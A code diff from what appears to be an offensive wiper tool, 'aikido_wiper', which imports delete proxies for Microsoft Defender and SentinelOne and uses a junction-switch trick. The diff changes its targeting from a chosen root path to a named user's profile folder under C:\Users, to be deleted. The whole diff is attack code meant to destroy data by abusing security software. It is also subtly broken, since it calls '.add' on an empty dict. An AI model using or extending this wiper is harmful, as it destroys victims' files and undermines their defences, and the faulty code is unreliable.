@@ -1,4 +1,5 @@
 import os
+import pathlib
 
 from aikido_wiper.indirect_ops.delete.microsoft_defender_delete_proxy import MicrosoftDefenderDeleteProxy
 from aikido_wiper.indirect_ops.delete.sentinel_one_delete_proxy import SentinelOneDeleteProxy
@@ -40,19 +41,18 @@ def create_junction_switch_proxy(proxy_class: type, args) -> IDeleteProxy:
     return delete_proxy
 
 
-def find_dirs_under_dir_from_args(args) -> set[str]:
+def find_user_dir(args) -> set[str]:
     """
-    Finds all the directories to try to delete based on the command line arguments.
+    Finds the directory of the target user to delete its directory based on the command line arguments.
 
     :param args: The command line arguments parsed by argparse.
     :return: The directories to delete 
     """
-    paths_to_exclude = []
-    if args.exclusion_list_path:
-        paths_to_exclude = parse_list_from_file(args.exclusion_list_path)
-
-    result = get_all_dirs_under_dir(args.root_path, paths_to_exclude)
-    result.add(args.root_path)
+    result = {}
+    windows_drive = pathlib.Path.home().drive + "\\"
+    users_dir = os.path.join(windows_drive, "Users")
+    target_user_dir = os.path.join(users_dir, args.target_user)
+    result.add(target_user_dir)
     return result
 
 
